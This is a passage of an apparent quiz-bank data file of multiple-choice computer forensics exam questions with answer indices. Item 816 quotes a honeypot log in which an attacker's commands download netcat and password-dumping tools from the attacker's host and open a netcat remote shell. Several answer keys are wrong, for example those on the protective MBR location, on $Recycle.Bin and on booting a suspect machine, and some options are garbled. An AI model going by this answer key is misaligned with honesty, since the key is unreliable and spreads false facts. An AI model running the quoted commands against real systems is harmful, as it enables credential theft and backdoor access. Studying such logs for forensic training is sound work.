      "When a user deletes a file, the system creates a $I file to store its details. What detail does the $I file not contain?",
    options: [
      "File Size",
      "File origin and modification",
      "Time and date of deletion",
      "File Name",
    ],
    correctAnswer: 1,
  },
  {
    id: 698,
    question:
      "Which of the following setups should a tester choose to analyze malware behavior?",
    options: [
      "A virtual system with internet connection",
      "A normal system without internet connect",
      "A normal system with internet connection",
      "A virtual system with network simulation for internet connection",
    ],
    correctAnswer: 3,
  },
  {
    id: 699,
    question:
      "Which of the following Linux command searches through the current processes and lists the process IDs those match the selection criteria to stdout?",
    options: ["pstree", "pgrep", "ps", "grep"],
    correctAnswer: 1,
  },
  {
    id: 700,
    question: "What is the location of a Protective MBR in a GPT disk layout?",
    options: [
      "Logical Block Address (LBA) 2",
      "Logical Block Address (LBA) 0",
      "Logical Block Address (LBA) 1",
      "Logical Block Address (LBA) 3",
    ],
    correctAnswer: 2,
  },
  {
    id: 701,
    question:
      "An attacker has compromised a cloud environment of a company and used the employee information to perform an identity theft attack. Which type of attack is this?",
    options: [
      "Cloud as a subject",
      "Cloud as a tool",
      "Cloud as an object",
      "Cloud as a service",
    ],
    correctAnswer: 0,
  },
  {
    id: 703,
    question:
      "Which among the following search warrants allows the first responder to search and seize the victim’s computer components such as hardware, software, storage devices, and documentation?",
    options: [
      "John Doe Search Warrant",
      "Citizen Informant Search Warrant",
      "Electronic Storage Device Search Warrant",
      "Service Provider Search Warrant",
    ],
    correctAnswer: 2,
  },
  {
    id: 704,
    question:
      "Which layer of iOS architecture should a forensics investigator evaluate to analyze services such as Threading, File Access, Preferences, Networking and high-level features?",
    options: ["Core Services", "Media services", "Cocoa Touch", "Core OS"],
    correctAnswer: 3,
  },
  {
    id: 705,
    question:
      "Amelia has got an email from a well-reputed company stating in the subject line that she has won a prize money, whereas the email body says that she has to pay a certain amount for being eligible for the contest. Which of the following acts does the email breach?",
    options: ["CAN-SPAM Act", "HIPAA", "GLBA", "SOX"],
    correctAnswer: 0,
  },
  {
    id: 706,
    question:
      "You are working as an independent computer forensics investigator and received a call from a systems administrator for a local school system requesting your assistance. One of the students at the local high school is suspected of downloading inappropriate images from the Internet to a PC in the Computer Lab. When you arrive at the school, the systems administrator hands you a hard drive and tells you that he made a “simple backup copy” of the hard drive in the PC and put it on this drive and requests that you examine the drive for evidence of the suspected images. You inform him that a “simple backup copy” will not provide deleted files or recover file fragments. What type of copy do you need to make to ensure that the evidence found is complete and admissible in future proceeding?",
    options: [
      "Robust copy",
      "Incremental backup copy",
      "Bit-stream copy",
      "Full backup copy",
    ],
    correctAnswer: 2,
  },
  {
    id: 707,
    question:
      "What is the capacity of Recycle bin in a system running on Windows Vista?",
    options: ["2.99GB", "3.99GB", "Unlimited", "10% of the partition space"],
    correctAnswer: 2,
  },
  {
    id: 709,
    question:
      "Which among the following tools can help a forensic investigator to access the registry files during postmortem analysis?",
    options: ["RegistryChangesView", "RegDIIView", "RegRipper", "ProDiscover"],
    correctAnswer: 2,
  },
  {
    id: 711,
    question:
      "Pick the statement which does not belong to the Rule 804. Hearsay Exceptions; Declarant Unavailable.",
    options: [
      "Statement of personal or family history",
      "Prior statement by witness",
      "Statement against interest",
      "Statement under belief of impending death",
    ],
    correctAnswer: 3,
  },
  {
    id: 713,
    question: "What does Locard's Exchange Principle state?",
    options: [
      "Any information of probative value that is either stored or transmitted in a digital form",
      "Digital evidence must have some characteristics to be disclosed in the court of law",
      "Anyone or anything, entering a crime scene takes something of the scene with them, and leaves something of themselves behind when they leave",
      "Forensic investigators face many challenges during forensics investigation of a digital crime, such as extracting, preserving, and analyzing the digital evidence",
    ],
    correctAnswer: 2,
  },
  {
    id: 716,
    question:
      "Jim’s company regularly performs backups of their critical servers. But the company can’t afford to send backup tapes to an off-site vendor for long term storage and archiving. Instead Jim’s company keeps the backup tapes in a safe in the office. Jim’s company is audited each year, and the results from this year’s audit show a risk because backup tapes aren’t stored off-site. The Manager of Information Technology has a plan to take the backup tapes home with him and wants to know what two things he can do to secure the backup tapes while in transit?",
    options: [
      "Encrypt the backup tapes and use a courier to transport them.",
      "Encrypt the backup tapes and transport them in a lock box",
      "Degauss the backup tapes and transport them in a lock box.",
      "Hash the backup tapes and transport them in a lock box.",
    ],
    correctAnswer: 1,
  },
  {
    id: 717,
    question: "Which of the following is a device monitoring tool?",
    options: ["Capsa", "Driver Detective", "Regshot", "RAM Capturer"],
    correctAnswer: 0,
  },
  {
    id: 718,
    question:
      "For what purpose do the investigators use tools like iPhoneBrowser, iFunBox, OpenSSHSSH, and iMazing?",
    options: [
      "Bypassing iPhone passcode",
      "Debugging iPhone",
      "Rooting iPhone",
      "Copying contents of iPhone",
    ],
    correctAnswer: 0,
  },
  {
    id: 719,
    question: "Which of the following techniques delete the files permanently?",
    options: [
      "Steganography",
      "Artifact Wiping",
      "Data Hiding",
      "Trail obfuscation",
    ],
    correctAnswer: 1,
  },
  {
    id: 722,
    question:
      "Checkpoint Firewall logs can be viewed through a Check Point Log viewer that uses icons and colors in the log table to represent different security events and their severity. What does the icon in the checkpoint logs represent?",
    options: [
      "The firewall rejected a connection",
      "A virus was detected in an email",
      "The firewall dropped a connection",
      "An email was marked as potential spam",
    ],
    correctAnswer: 2,
  },
  {
    id: 723,
    question:
      "In Windows, prefetching is done to improve system performance. There are two types of prefetching: boot prefetching and application prefetching. During boot prefetching, what does the Cache Manager do?",
    options: [
      "Determines the data associated with value EnablePrefetcher",
      "Monitors the first 10 seconds after the process is started",
      "Checks whether the data is processed",
      "Checks hard page faults and soft page faults",
    ],
    correctAnswer: 2,
  },
  {
    id: 724,
    question:
      "Chong-lee, a forensics executive, suspects that a malware is continuously making copies of files and folders on a victim system to consume the available disk space. What type of test would confirm his claim?",
    options: [
      "File fingerprinting",
      "Identifying file obfuscation",
      "Static analysis",
      "Dynamic analysis",
    ],
    correctAnswer: 0,
  },
  {
    id: 726,
    question:
      "Which password cracking technique uses every possible combination of character sets?",
    options: [
      "Rainbow table attack",
      "Brute force attack",
      "Rule-based attack",
      "Dictionary attack",
    ],
    correctAnswer: 1,
  },
  {
    id: 727,
    question: "What is one method of bypassing a system BIOS password?",
    options: [
      "Removing the processor",
      "Removing the CMOS battery",
      "Remove all the system memory",
      "Login to Windows and disable the BIOS password",
    ],
    correctAnswer: 1,
  },
  {
    id: 728,
    question:
      "Smith, a forensic examiner, was analyzing a hard disk image to find and acquire deleted sensitive files. He stumbled upon a $Recycle.Bin folder in the root directory of the disk. Identify the operating system in use.",
    options: ["Windows 98", "Linux", "Windows 8.1", "Windows XP"],
    correctAnswer: 3,
  },
  {
    id: 729,
    question:
      "What must an investigator do before disconnecting an iPod from any type of computer?",
    options: [
      "Unmount the iPod",
      "Mount the iPod",
      "Disjoin the iPod",
      "Join the iPod",
    ],
    correctAnswer: 0,
  },
  {
    id: 730,
    question:
      "Company ABC has employed a firewall, IDS, Antivirus, Domain Controller, and SIEM. The company’s domain controller goes down. From which system would you begin your investigation?",
    options: ["Domain Controller", "Firewall", "SIEM", "IDS"],
    correctAnswer: 2,
  },
  {
    id: 731,
    question:
      "The investigator wants to examine changes made to the system’s registry by the suspect program. Which of the following tool can help the investigator?",
    options: ["TRIPWIRE", "RAM Capturer", "Regshot", "What’s Running"],
    correctAnswer: 2,
  },
  {
    id: 732,
    question:
      "Under confession, an accused criminal admitted to encrypting child pornography pictures and then hiding them within other pictures. What technique did the accused criminal employ?",
    options: [
      "Typography",
      "Steganalysis",
      "Picture encoding",
      "Steganography",
    ],
    correctAnswer: 3,
  },
  {
    id: 734,
    question: "Which program is the bootloader when Windows XP starts up?",
    options: ["KERNEL.EXE", "NTLDR", "LOADER", "LILO"],
    correctAnswer: 1,
  },
  {
    id: 735,
    question:
      "Jack Smith is a forensics investigator who works for Mason Computer Investigation Services. He is investigating a computer that was infected by Ramen Virus. He runs the netstat command on the machine to see its current connections. In the following screenshot, what do the 0.0.0.0 IP addresses signify?",
    options: [
      "Those connections are established",
      "Those connections are in listening mode",
      "Those connections are in closed/waiting mode",
      "Those connections are in timed out/waiting mode",
    ],
    correctAnswer: 1,
  },
  {
    id: 737,
    question:
      "You have been called in to help with an investigation of an alleged network intrusion. After questioning the members of the company IT department, you search through the server log files to find any trace of the intrusion. After that you decide to telnet into one of the company routers to see if there is any evidence to be found. While connected to the router, you see some unusual activity and believe that the attackers are currently connected to that router. You start up an ethereal session to begin capturing traffic on the router that could be used in the investigation. At what layer of the OSI model are you monitoring while watching traffic to and from the router?",
    options: ["Network", "Transport", "Data Link", "Session"],
    correctAnswer: 0,
  },
  {
    id: 739,
    question:
      "What type of equipment would a forensics investigator store in a StrongHold bag?",
    options: ["PDAPDA?", "Backup tapes", "Hard drives", "Wireless cards"],
    correctAnswer: 3,
  },
  {
    id: 740,
    question:
      "When searching through file headers for picture file formats, what should be searched to find a JPEG file in hexadecimal format?",
    options: [
      "FF D8 FF E0 00 10",
      "FF FF FF FF FF FF",
      "FF 00 FF 00 FF 00",
      "EF 00 EF 00 EF 00",
    ],
    correctAnswer: 0,
  },
  {
    id: 741,
    question:
      "What will the following command accomplish in Linux? fdisk /dev/hda",
    options: [
      "Partition the hard drive",
      "Format the hard drive",
      "Delete all files under the /dev/hda folder",
      "Fill the disk with zeros",
    ],
    correctAnswer: 0,
  },
  {
    id: 744,
    question:
      "All Blackberry email is eventually sent and received through what proprietary RIM-operated mechanism?",
    options: [
      "Blackberry Message Center",
      "Microsoft Exchange",
      "Blackberry WAP gateway",
      "Blackberry WEP gateway",
    ],
    correctAnswer: 0,
  },
  {
    id: 745,
    question:
      "The process of restarting a computer that is already turned on through the operating system is called?",
    options: ["Warm boot", "Ice boot", "Hot Boot", "Cold boot"],
    correctAnswer: 0,
  },
  {
    id: 746,
    question:
      "Why would you need to find out the gateway of a device when investigating a wireless attack?",
    options: [
      "The gateway will be the IP of the proxy server used by the attacker to launch the attack",
      "The gateway will be the IP of the attacker computer",
      "The gateway will be the IP used to manage the RADIUS server",
      "The gateway will be the IP used to manage the access point",
    ],
    correctAnswer: 3,
  },
  {
    id: 748,
    question:
      "Your company's network just finished going through a SAS 70 audit. This audit reported that overall, your network is secure, but there are some areas that needs improvement. The major area was SNMP security. The audit company recommended turning off SNMP, but that is not an option since you have so many remote nodes to keep track of. What step could you take to help secure SNMP on your network?",
    options: [
      "Block all internal MAC address from using SNMP",
      "Block access to UDP port 171",
      "Block access to TCP port 171",
      "Change the default community string names",
    ],
    correctAnswer: 3,
  },
  {
    id: 749,
    question:
      "You have been given the task to investigate web attacks on a Windows-based server. Which of the following commands will you use to look at the sessions the machine has opened with other systems?",
    options: ["Net sessions", "Net config", "Net share", "Net use"],
    correctAnswer: 3,
  },
  {
    id: 750,
    question:
      "Ivanovich, a forensics investigator, is trying to extract complete information about running processes from a system. Where should he look apart from the RAM and virtual memory?",
    options: [
      "Swap space",
      "Application data",
      "Files and documents",
      "Slack space",
    ],
    correctAnswer: 0,
  },
  {
    id: 751,
    question:
      "A small law firm located in the Midwest has possibly been breached by a computer hacker looking to obtain information on their clientele. The law firm does not have any on-site IT employees, but wants to search for evidence of the breach themselves to prevent any possible media attention. Why would this not be recommended?",
    options: [
      "Searching for evidence themselves would not have any ill effects",
      "Searching could possibly crash the machine or device",
      "Searching creates cache files, which would hinder the investigation",
      "Searching can change date/time stamps",
    ],
    correctAnswer: 3,
  },
  {
    id: 752,
    question:
      "What does the 63.78.199.4(161) denote in a Cisco router log?\nMar 14 22:57:53.425 EST: %SEC-6-IPACCESSLOGP: list internet-inbound denied udp 66.56.16.77(1029) -> 63.78.199.4(161), 1 packet",
    options: [
      "Destination IP address",
      "Source IP address",
      "Login IP address",
      "None of the above",
    ],
    correctAnswer: 0,
  },
  {
    id: 753,
    question: "What layer of the OSI model do TCP and UDP utilize?",
    options: ["Data Link", "Network", "Transport", "Session"],
    correctAnswer: 2,
  },
  {
    id: 754,
    question:
      "Which forensic investigating concept trails the whole incident from how the attack began to how the victim was affected?",
    options: [
      "Point-to-point",
      "End-to-end",
      "Thorough",
      "Complete event analysis",
    ],
    correctAnswer: 1,
  },
  {
    id: 755,
    question:
      "John is working on his company policies and guidelines. The section he is currently working on covers company documents; how they should be handled, stored, and eventually destroyed. John is concerned about the process whereby outdated documents are destroyed. What type of shredder should John write in the guidelines to be used when destroying documents?",
    options: [
      "Strip-cut shredder",
      "Cross-cut shredder",
      "Cross-hatch shredder",
      "Cris-cross shredder",
    ],
    correctAnswer: 1,
  },
  {
    id: 756,
    question:
      "When should an MD5 hash check be performed when processing evidence?",
    options: [
      "After the evidence examination has been completed",
      "On an hourly basis during the evidence examination",
      "Before and after evidence examination",
      "Before the evidence examination has been completed",
    ],
    correctAnswer: 2,
  },
  {
    id: 757,
    question:
      "What is the slave device connected to the secondary IDE controller on a Linux OS referred to?",
    options: ["hda", "hdd", "hdb", "hdc"],
    correctAnswer: 1,
  },
  {
    id: 759,
    question:
      "Why should you never power on a computer that you need to acquire digital evidence from?",
    options: [
      "When the computer boots up, files are written to the computer rendering the data unclean",
      "When the computer boots up, the system cache is cleared which could destroy evidence",
      "When the computer boots up, data in the memory buffer is cleared which could destroy evidence",
      "Powering on a computer has no effect when needing to acquire digital evidence from it",
    ],
    correctAnswer: 0,
  },
  {
    id: 760,
    question:
      "This type of testimony is presented by someone who does the actual fieldwork and does not offer a view in court.",
    options: [
      "Civil litigation testimony",
      "Expert testimony",
      "Victim advocate testimony",
      "Technical testimony",
    ],
    correctAnswer: 3,
  },
  {
    id: 761,
    question:
      "What type of attack sends spoofed UDP packets (instead of ping packets) with a fake source address to the IP broadcast address of a large network?",
    options: ["Fraggle", "Smurf scan", "SYN flood", "Teardrop"],
    correctAnswer: 0,
  },
  {
    id: 762,
    question:
      "An executive has leaked the company trade secrets through an external drive. What process should the investigation team take if they could retrieve his system?",
    options: [
      "Postmortem Analysis",
      "Real-Time Analysis",
      "Packet Analysis",
      "Malware Analysis",
    ],
    correctAnswer: 0,
  },
  {
    id: 763,
    question:
      "What must be obtained before an investigation is carried out at a location?",
    options: ["Search warrant", "Subpoena", "Habeas corpus", "Modus operandi"],
    correctAnswer: 0,
  },
  {
    id: 764,
    question:
      "While presenting his case to the court, Simon calls many witnesses to the stand to testify. Simon decides to call Hillary Taft, a lay witness, to the stand. Since Hillary is a lay witness, what field would she be considered an expert in?",
    options: [
      "Technical material related to forensics",
      "No particular field",
      "Judging the character of defendants/victims",
      "Legal issues",
    ],
    correctAnswer: 1,
  },
  {
    id: 765,
    question:
      "The following is a log file screenshot from a default installation of IIS 6.0. What time standard is used by IIS as seen in the screenshot?",
    options: ["UTC", "GMT", "TAI", "UT"],
    correctAnswer: 0,
  },
  {
    id: 766,
    question: "What is the size value of a nibble?",
    options: ["0.5 kilo byte", "0.5 bit", "0.5 byte", "2 bits"],
    correctAnswer: 2,
  },
  {
    id: 767,
    question:
      "When marking evidence that has been collected with the “aaa/ddmmyy/nnnn/zz” format, what does the “nnnn” denote?",
    options: [
      "The initials of the forensics analyst",
      "The sequence number for the parts of the same exhibit",
      "The year the evidence was taken",
      "The sequential number of the exhibits seized by the analyst",
    ],
    correctAnswer: 3,
  },
  {
    id: 768,
    question:
      "Richard is extracting volatile data from a system and uses the command doskey/history. What is he trying to extract?",
    options: [
      "Events history",
      "Previously typed commands",
      "History of the browser",
      "Passwords used across the system",
    ],
    correctAnswer: 1,
  },
  {
    id: 769,
    question:
      "An investigator is searching through the firewall logs of a company and notices ICMP packets that are larger than 65,536 bytes. What type of activity is the investigator seeing?",
    options: ["Smurf", "Ping of death", "Fraggle", "Nmap scan"],
    correctAnswer: 1,
  },
  {
    id: 770,
    question: "Where are files temporarily written in Unix when printing?",
    options: ["/usr/spool", "/var/print", "/spool", "/var/spool"],
    correctAnswer: 3,
  },
  {
    id: 771,
    question:
      "In Windows Security Event Log, what does an event id of 530 imply?",
    options: [
      "Logon Failure – Unknown user name or bad password",
      "Logon Failure – User not allowed to logon at this computer",
      "Logon Failure – Account logon time restriction violation",
      "Logon Failure – Account currently disabled",
    ],
    correctAnswer: 2,
  },
  {
    id: 772,
    question:
      "In handling computer-related incidents, which IT role should be responsible for recovery, containment, and prevention to constituents?",
    options: [
      "Security Administrator",
      "Network Administrator",
      "Director of Information Technology",
      "Director of Administration",
    ],
    correctAnswer: 1,
  },
  {
    id: 773,
    question:
      "What feature of Windows is the following command trying to utilize?",
    options: ["White space", "AFS", "ADS", "Slack file"],
    correctAnswer: 2,
  },
  {
    id: 774,
    question:
      "Microsoft Security IDs are available in Windows Registry Editor. The path to locate IDs in Windows 7 is:",
    options: [
      "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList",
      "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ProfileList",
      "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\RegList",
      "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Regedit",
    ],
    correctAnswer: 0,
  },
  {
    id: 775,
    question:
      "If you are concerned about a high level of compression but not concerned about any possible data loss, what type of compression would you use?",
    options: [
      "Lossful compression",
      "Lossy compression",
      "Lossless compression",
      "Time-loss compression",
    ],
    correctAnswer: 1,
  },
  {
    id: 776,
    question:
      "What technique used by Encase makes it virtually impossible to tamper with evidence once it has been acquired?",
    options: [
      "Every byte of the file(s) is given an MD5 hash to match against a master file",
      "Every byte of the file(s) is verified using 32-bit CRC",
      "Every byte of the file(s) is copied to three different hard drives",
      "Every byte of the file(s) is encrypted using three different methods",
    ],
    correctAnswer: 1,
  },
  {
    id: 777,
    question:
      "Using Linux to carry out a forensics investigation, what would the following command accomplish? dd if=/usr/home/partition.image of=/dev/sdb2 bs=4096 conv=notrunc,noerror",
    options: [
      "Search for disk errors within an image file",
      "Backup a disk to an image file",
      "Copy a partition to an image file",
      "Restore a disk from an image file",
    ],
    correctAnswer: 3,
  },
  {
    id: 778,
    question:
      "When an investigator contacts by telephone the domain administrator or controller listed by a whois lookup to request all e-mails sent and received for a user account be preserved, what U.S.C. statute authorizes this phone call and obligates the ISP to preserve e-mail records?",
    options: [
      "Title 18, Section 1030",
      "Title 18, Section 2703(d)",
      "Title 18, Section Chapter 90",
      "Title 18, Section 2703(f)",
    ],
    correctAnswer: 3,
  },
  {
    id: 782,
    question:
      "To calculate the number of bytes on a disk, the formula is: CHS**",
    options: [
      "number of circles x number of halves x number of sides x 512 bytes per sector",
      "number of cylinders x number of halves x number of shims x 512 bytes per sector",
      "number of cells x number of heads x number of sides x 512 bytes per sector",
      "number of cylinders x number of halves x number of shims x 512 bytes per sector",
    ],
    correctAnswer: 1,
  },
  {
    id: 784,
    question:
      "A honey pot deployed with the IP 172.16.1.108 was compromised by an attacker. Given below is an excerpt from a Snort binary capture of the attack. Decipher the activity carried out by the attacker by studying the log.",
    options: [
      "The attacker has conducted a network sweep on port 111",
      "The attacker has scanned and exploited the system using Buffer Overflow",
      "The attacker has used a Trojan on port 32773",
      "The attacker has installed a backdoor",
    ],
    correctAnswer: 0,
  },
  {
    id: 785,
    question: "The newer Macintosh Operating System is based on:",
    options: ["OS/2", "BSD Unix", "Linux", "Microsoft Windows"],
    correctAnswer: 1,
  },
  {
    id: 786,
    question:
      "Before you are called to testify as an expert, what must an attorney do first?",
    options: [
      "engage in damage control",
      "prove that the tools you used to conduct your examination are perfect",
      "read your curriculum vitae to the jury",
      "qualify you as an expert witness",
    ],
    correctAnswer: 3,
  },
  {
    id: 793,
    question:
      "A suspect is accused of violating the acceptable use of computing resources, as he has visited adult websites and downloaded images. The investigator wants to demonstrate that the suspect did indeed visit these sites. However, the suspect has cleared the search history and emptied the cookie cache. Moreover, he has removed any images he might have downloaded. What can the investigator do to prove the violation? Choose the most feasible option.",
    options: [
      "Image the disk and try to recover deleted files",
      "Seek the help of co-workers who are eye-witnesses",
      "Check the Windows registry for connection data (You may or may not recover)",
      "Approach the websites for evidence",
    ],
    correctAnswer: 0,
  },
  {
    id: 807,
    question:
      "In a forensic examination of hard drives for digital evidence, what type of user is most likely to have the most file slack to analyze?",
    options: [
      "one who has NTFS 4 or 5 partitions",
      "one who uses dynamic swap file capability",
      "one who uses hard disk writes on IRQ 13 and 21",
      "one who has lots of allocation units per block or cluster",
    ],
    correctAnswer: 3,
  },
  {
    id: 809,
    question:
      "You are assigned to work in the computer forensics lab of a state police agency. While working on a high profile criminal case, you have followed every applicable procedure, however your boss is still concerned that the defense attorney might question whether evidence has been changed while at the lab. What can you do to prove that the evidence is the same as it was when it first entered the lab?",
    options: [
      "make an MD5 hash of the evidence and compare it with the original MD5 hash that was taken when the evidence first entered the lab",
      "make an MD5 hash of the evidence and compare it to the standard database developed by NIST",
      "there is no reason to worry about this possible claim because state labs are certified",
      "sign a statement attesting that the evidence is the same as it was when it entered the lab",
    ],
    correctAnswer: 0,
  },
  {
    id: 810,
    question:
      "Study the log given below and answer the following question: Apr 24 14:46:46 [4663]: spp_portscan: portscan detected from 194.222.156.169 Apr 24 14:46:46 [4663]: IDS27/FIN Scan: 194.222.156.169:56693 -> 172.16.1.107:482 Apr 24 18:01:05 [4663]: IDS/DNS-version-query: 212.244.97.121:3485 -> 172.16.1.107:53 Apr 24 19:04:01 [4663]: IDS213/ftp-passwd-retrieval: 194.222.156.169:1425 -> 172.16.1.107:21 Apr 25 08:02:41 [5875]: spp_portscan: PORTSCAN DETECTED from 24.9.255.53 Apr 25 02:08:07 [5875]: IDS277/DNS-version-query: 63.226.81.13:4499 -> 172.16.1.107:53 Apr 25 02:08:07 [5875]: IDS277/DNS-version-query: 63.226.81.13:4630 -> 172.16.1.101:53 Apr 25 02:38:17 [5875]: IDS/RPC-rpcinfo-query: 212.251.1.94:642 -> 172.16.1.107:111 Apr 25 19:37:32 [5875]: IDS230/web-cgi-space-wildcard: 198.173.35.164:4221 -> 172.16.1.107:80 Apr 26 05:45:12 [6283]: IDS212/dns-zone-transfer: 38.31.107.87:2291 -> 172.16.1.101:53 Apr 26 06:43:05 [6283]: IDS181/nops-x86: 63.226.81.13:1351 -> 172.16.1.107:53 Apr 26 06:44:25 victim7 PAM_pwdb[12509]: (login) session opened for user simple by (uid=0) Apr 26 06:44:36 victim7 PAM_pwdb[12521]: (su) session opened for user simon by simple(uid=506) Apr 26 06:45:34 [6283]: IDS175/socks-probe: 24.112.167.35:20 -> 172.16.1.107:1080 Apr 26 06:52:10 [6283]: IDS127/telnet-login-incorrect: 172.16.1.107:23 -> 213.28.22.189:4558 Precautionary measures to prevent this attack would include writing firewall rules. Of these firewall rules, which among the following would be appropriate?",
    options: [
      "Disallow UDP53 in from outside to DNS server",
      "Allow UDP53 in from DNS server to outside",
      "Disallow TCP53 in from secondaries or ISP server to DNS server",
      "Block all UDP traffic",
    ],
    correctAnswer: 0,
  },
  {
    id: 812,
    question:
      "When investigating a potential e-mail crime, what is your first step in the investigation?",
    options: [
      "Trace the IP address to its origin",
      "Write a report",
      "Determine whether a crime was actually committed",
      "Recover the evidence",
    ],
    correctAnswer: 0,
  },
  {
    id: 813,
    question:
      "If a suspect computer is located in an area that may have toxic chemicals, you must:",
    options: [
      "coordinate with the HAZMAT team",
      "determine a way to obtain the suspect computer",
      "assume the suspect machine is contaminated",
      "do not enter alone",
    ],
    correctAnswer: 0,
  },
  {
    id: 814,
    question:
      "The following excerpt is taken from a honeypot log. The log captures activities across three days. There are several intrusion attempts; however, a few are successful. (Note: The objective of this question is to test whether the student can read basic information from log entries and interpret the nature of attack.) Apr 24 14:46:46 [4663]: spp_portscan: portscan detected from 194.222.156.169 Apr 24 14:46:46 [4663]: IDS27/FIN Scan: 194.222.156.169:56693 -> 172.16.1.107:482 Apr 24 18:01:05 [4663]: IDS/DNS-version-query: 212.244.97.121:3485 -> 172.16.1.107:53 Apr 24 19:04:01 [4663]: IDS213/ftp-passwd-retrieval: 194.222.156.169:1425 -> 172.16.1.107:21 Apr 25 08:02:41 [5875]: spp_portscan: PORTSCAN DETECTED from 24.9.255.53 Apr 25 02:08:07 [5875]: IDS277/DNS-version-query: 63.226.81.13:4499 -> 172.16.1.107:53 Apr 25 02:08:07 [5875]: IDS277/DNS-version-query: 63.226.81.13:4630 -> 172.16.1.101:53 Apr 25 02:38:17 [5875]: IDS/RPC-rpcinfo-query: 212.251.1.94:642 -> 172.16.1.107:111 Apr 25 19:37:32 [5875]: IDS230/web-cgi-space-wildcard: 198.173.35.164:4221 -> 172.16.1.107:80 Apr 26 05:45:12 [6283]: IDS212/dns-zone-transfer: 38.31.107.87:2291 -> 172.16.1.101:53 Apr 26 06:43:05 [6283]: IDS181/nops-x86: 63.226.81.13:1351 -> 172.16.1.107:53 Apr 26 06:44:25 victim7 PAM_pwdb[12509]: (login) session opened for user simple by (uid=0) Apr 26 06:44:36 victim7 PAM_pwdb[12521]: (su) session opened for user simon by simple(uid=506) Apr 26 06:45:34 [6283]: IDS175/socks-probe: 24.112.167.35:20 -> 172.16.1.107:1080 Apr 26 06:52:10 [6283]: IDS127/telnet-login-incorrect: 172.16.1.107:23 -> 213.28.22.189:4558 From the options given below choose the one which best interprets the following entry: Apr 26 06:43:05 [6283]: IDS181/nops-x86: 63.226.81.13:1351 -> 172.16.1.107:53",
    options: [
      "An IDS evasion technique",
      "A buffer overflow attempt",
      "A DNS zone transfer",
      "Data being retrieved from 63.226.81.13",
    ],
    correctAnswer: 0,
  },
  {
    id: 815,
    question:
      "What happens when a file is deleted by a Microsoft operating system using the FAT file system?",
    options: [
      "only the reference to the file is removed from the FAT",
      "the file is erased and cannot be recovered",
      "a copy of the file is stored and the original file is erased",
      "the file is erased but can be recovered",
    ],
    correctAnswer: 0,
  },
  {
    id: 816,
    question:
      'The following excerpt is taken from a honeypot log that was hosted at lab.wiretrip.net. Snort reported Unicode attacks from 213.116.251.162. The File Permission Canonicalization vulnerability (UNICODE attack) allows scripts to be run in arbitrary folders that do not normally have the right to run scripts. The attacker tries a Unicode attack and eventually succeeds in displaying boot.ini. He then switches to playing with RDS, via msadcs.dll. The RDS vulnerability allows a malicious user to construct SQL statements that will execute shell commands (such as CMD.EXE) on the IIS server. He does a quick query to discover that the directory exists, and a query to msadcs.dll shows that it is functioning correctly. The attacker makes a RDS query which results in the commands run as shown below.\n"cmd1.exe /c open 213.116.251.162 >ftpcom"\n"cmd1.exe /c echo johna2k >>ftpcom"\n"cmd1.exe /c echo haxedj00 >>ftpcom"\n"cmd1.exe /c echo get nc.exe >>ftpcom"\n"cmd1.exe /c echo get pdump.exe >>ftpcom"\n"cmd1.exe /c echo get samdump.dll >>ftpcom"\n"cmd1.exe /c echo quit >>ftpcom"\n"cmd1.exe /c ftp -s:ftpcom"\n"cmd1.exe /c nc -l -p 6969 -e cmd1.exe"\nWhat can you infer from the exploit given?',
    options: [
      "A. It is a local exploit where the attacker logs in using username johna2k",
      "B. There are two attackers on the system - johna2k and haxedj00",
      "C. The attack is a remote exploit and the hacker downloads three files",
      "D. The attacker is unsuccessful in spawning a shell as he has specified a high end UDP port",
    ],
    correctAnswer: 2,
  },
  {
    id: 818,
    question:
      "During the course of an investigation, you locate evidence that may prove the innocence of the suspect of the investigation. You must maintain an unbiased opinion and be objective in your entire fact finding process. Therefore you report this evidence. This type of evidence is known as:",
    options: [
      "A. Inculpatory evidence",
      "B. mandatory evidence",
      "C. exculpatory evidence",
      "D. Terrible evidence",
    ],
    correctAnswer: 2,
  },
  {
    id: 819,
    question:
      "If you discover a criminal act while investigating a corporate policy abuse, it becomes a public-sector investigation and should be referred to law enforcement?",
    options: ["A. true", "B. false"],
    correctAnswer: 0,
  },
  {
    id: 820,
    question: "What binary coding is used most often for e-mail purposes?",
    options: ["A. MIME", "B. Uuencode", "C. IMAP", "D. SMTP"],
    correctAnswer: 0,
  },
  {
    id: 821,
    question:
      "If you see the files Zer0.tar.gz and copy.tar.gz on a Linux system while doing an investigation, what can you conclude?",
    options: [
      "A. The system files have been copied by a remote attacker",
      "B. The system administrator has created an incremental backup",
      "C. The system has been compromised using a t0rnrootkit",
      "D. Nothing in particular as these can be operational files",
    ],
    correctAnswer: 3,
  },
  {
    id: 822,
    question:
      'From the following spam mail header, identify the host IP that sent this spam?\nFrom jie02@netvigator.com jie02@netvigator.com Tue Nov 27 17:27:11 2001\nReceived: from viruswall.ie.cuhk.edu.hk (viruswall [137.189.96.52]) by eng.ie.cuhk.edu.hk\n(8.11.6/8.11.6) with ESMTP id\nfAR9RAP23061 for ; Tue, 27 Nov 2001 17:27:10 +0800 (HKT)\nReceived: from mydomain.com (pcd249020.netvigator.com [203.218.39.20]) by\nviruswall.ie.cuhk.edu.hk (8.12.1/8.12.1)\nwith SMTP id fAR9QXwZ018431 for ; Tue, 27 Nov 2001 17:26:36 +0800 (HKT)\nMessage-Id: >200111270926.fAR9QXwZ018431@viruswall.ie.cuhk.edu.hk\nFrom: "china hotel web"\nTo: "Shlam"\nSubject: SHANGHAI (HILTON HOTEL) PACKAGE\nDate: Tue, 27 Nov 2001 17:25:58 +0800 MIME-Version: 1.0\nX-Priority: 3 X-MSMailPriority: Normal\nReply-To: "china hotel web"',
    options: [
      "A. 137.189.96.52",
      "B. 8.12.1.0",
      "C. 203.218.39.20",
      "D. 203.218.39.50",
    ],
    correctAnswer: 2,
  },
  {
    id: 823,
    question:
      "If you plan to startup a suspect's computer, you must modify the ___________ to ensure that you do not contaminate or alter data on the suspect's hard drive by booting to the hard drive.",
    options: [
      "A. deltree command",
      "B. CMOS",
      "C. Boot.sys",
      "D. Scandisk utility",
    ],
    correctAnswer: 2,
  },
  {
    id: 824,
    question:
